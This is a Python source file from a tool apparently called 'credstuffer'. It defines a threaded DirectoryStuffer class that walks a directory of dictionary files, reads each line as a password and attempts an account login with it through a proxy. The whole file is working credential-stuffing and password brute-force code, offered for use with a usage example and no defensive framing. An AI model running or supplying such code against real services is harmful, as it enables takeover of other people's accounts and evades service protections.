import os
import logging
import threading
from credstuffer.stuffer import Stuffer


class DirectoryStuffer(Stuffer, threading.Thread):
    """ class DirectoryStuffer to execute the stuffing algorithm with directories including dict files

    USAGE:
            dirstuffer = DirectoryStuffer(account=account, directory_path=/tmp/)
            dirstuffer.start()
    """
    def __init__(self, account, directory_path):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class DirectoryStuffer')

        # init base class
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)

        if os.path.isdir(directory_path):
            self.directory_path = directory_path
        else:
            raise TypeError("Given path {} is not a directory".format(directory_path))

    def run(self) -> None:
        """ executes the run thread for account logins """

        # set proxy to account
        self.set_account_proxy()

        # iterate through dirs and load each file
        self.logger.info("Load files from directory {}".format(self.directory_path))
        for root, subdirs, files in os.walk(self.directory_path):
            for file in files:
                filepath = os.path.join(root, file)
                if os.path.isfile(filepath):
                    self.logger.info("Open file {} for stuffing".format(filepath))
                    # get passwords from file
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        for lineno, line in enumerate(f):
                            password = line.strip('\n')
                            # execute login
                            self.account_login(password=password)
                            if (lineno % 1000) == 0:
                                self.logger.info("File {} with line number {} and password {}".format(file, lineno, password))
                else:
                    self.logger.error("File: {} is not a regular file".format(filepath))

